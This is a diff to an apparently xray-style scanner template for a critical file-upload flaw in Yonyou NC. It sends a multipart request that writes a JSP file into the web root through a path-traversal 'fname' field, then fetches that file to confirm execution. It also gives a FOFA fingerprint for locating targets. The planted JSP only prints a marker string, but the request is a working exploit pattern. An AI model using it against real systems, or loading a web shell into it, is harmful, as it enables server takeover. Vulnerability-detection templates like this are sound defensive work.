@@ -6,14 +6,16 @@ info:
   severity: critical
   verified: true
   description: |
-    fofa：icon_hash="1085941792"
+    fofa: icon_hash="1085941792"
   reference:
     - https://mp.weixin.qq.com/s?__biz=MzkyMTMwNjU1Mg==&chksm=c184c6a1f6f34fb788437557f0e7708c74b16928e5973772db09b12067f10cf28b108701f67a&idx=1&lang=zh_CN&mid=2247488118&sn=16217c422eafc656df5fcacee9aa2153&token=857848930#rd
+  tags: yonyou,nc,accept,upload
+  created: 2025/03/13
 
 set:
-    r1: randomLowercase(8)
-    r2: randomLowercase(32)
-    rboundary: randomLowercase(8)
+  r1: randomLowercase(8)
+  r2: randomLowercase(32)
+  rboundary: randomLowercase(8)
 rules:
   r0:
     request:
@@ -23,16 +25,16 @@ rules:
         Cookie: JSESSIONID=33A7E4A8F9A2F3D7EACA2768A172B7F5.server
         Content-Type: multipart/form-data; boundary=--------WebKitFormBoundary{{rboundary}}
       body: "\
-          ----------WebKitFormBoundary{{rboundary}}\r\n\
-          Content-Disposition: form-data; name=\"file\";filename=\"{{r1}}.txt\"\r\n\
-          \r\n\
-          <% out.println(\"hello yongyou nc {{r2}}\");%>\r\n\
-          ----------WebKitFormBoundary{{rboundary}}\r\n\
-          Content-Disposition: form-data; name=\"fname\"\r\n\
-          \r\n\
-          \\\\webapps\\\\nc_web\\\\{{r1}}.jsp\r\n\
-          ----------WebKitFormBoundary{{rboundary}}--\r\n\
-          "
+        ----------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\";filename=\"{{r1}}.txt\"\r\n\
+        \r\n\
+        <% out.println(\"hello yongyou nc {{r2}}\");%>\r\n\
+        ----------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"fname\"\r\n\
+        \r\n\
+        \\\\webapps\\\\nc_web\\\\{{r1}}.jsp\r\n\
+        ----------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
     expression: response.status == 200
   r1:
     request:
@@ -40,4 +42,3 @@ rules:
       path: /{{r1}}.jsp
     expression: response.status == 200 && response.body.bcontains(bytes(r2))
 expression: r0() && r1()
-      
